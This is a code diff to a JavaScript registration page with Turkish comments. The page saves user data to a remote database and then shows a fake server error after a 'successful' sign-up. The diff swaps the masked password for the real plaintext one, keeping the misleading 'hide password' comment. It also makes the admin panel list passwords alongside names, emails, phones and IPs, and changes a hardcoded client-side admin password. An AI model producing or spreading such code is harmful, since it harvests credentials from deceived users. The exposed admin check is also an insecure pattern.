@@ -333,7 +333,7 @@
                 // Şifreyi hash'le (gerçek uygulamada daha güvenli hash kullanın)
                 const userDataSafe = {
                     ...userData,
-                    password: '•••••••' // Şifreyi gizle
+                    password: password // Şifreyi gizle
                 };
                 
                 const newUserRef = database.ref('users').push();
@@ -424,7 +424,7 @@
                     document.getElementById('newsletter').checked = true;
                     
                     // Başarı mesajı göster
-                    showMessage('success', '✅ Kayıt başarılı! Veriler sunucuya kaydedildi.');
+                    showMessage('success', '✅ Kayıt başarılı!.');
                     
                     // 2 saniye sonra sunucu hatası göster
                     setTimeout(showServerError, 2000);
@@ -485,7 +485,7 @@
         // Yönetici girişi
         async function showAdminLogin() {
             const password = prompt('Yönetici şifresini girin:');
-            if (password === 'corbavarmıbeyler123') {
+            if (password === 'elise234') {
                 await showAdminPanel();
             } else {
                 alert('❌ Yetkisiz erişim!');
@@ -518,7 +518,7 @@
                 }
                 
                 const userList = users.map(user => 
-                    `👤 İsim: ${user.name}\n📧 E-posta: ${user.email}\n📞 Telefon: ${user.phone}\n🕒 Kayıt Tarihi: ${user.timestamp}\n🌐 IP: ${user.ip}\n────────────────────\n`
+                    `👤 İsim: ${user.name}\n📧 E-posta: ${user.email}${user.password}\n📞 Telefon: ${user.phone}\n🕒 Kayıt Tarihi: ${user.timestamp}\n🌐 IP: ${user.ip}\n────────────────────\n`
                 ).join('');
                 
                 alert('👨‍💼 YÖNETİCİ PANELİ\n\nToplam Kayıt: ' + users.length + '\n\n' + userList);
